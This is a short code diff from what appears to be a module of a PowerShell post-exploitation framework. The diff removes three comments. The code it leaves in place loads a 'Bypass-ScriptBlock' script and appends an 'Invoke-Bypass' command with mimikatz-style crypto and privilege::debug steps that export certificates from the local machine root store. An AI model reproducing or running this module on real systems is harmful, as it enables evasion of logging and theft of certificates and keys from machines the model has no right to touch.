@@ -27,7 +27,7 @@ class Module:
             ]
         }
 
-        # any options needed by the module, settable during runtime
+         
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
@@ -50,7 +50,7 @@ class Module:
 
     def generate(self):
         
-        # read in the common module source code
+        
         moduleSource = self.mainMenu.installPath + "/data/module_source/management/Bypass-ScriptBlock.ps1"
         try:
             f = open(moduleSource, 'r')
@@ -63,7 +63,7 @@ class Module:
 
         script = moduleCode
         
-        # add in the cert dumping command
+         
         script += """Invoke-Bypass -Command 'crypto::capi privilege::debug crypto::cng "crypto::certificates /systemstore:local_machine /store:root /export"' """
         
         return script
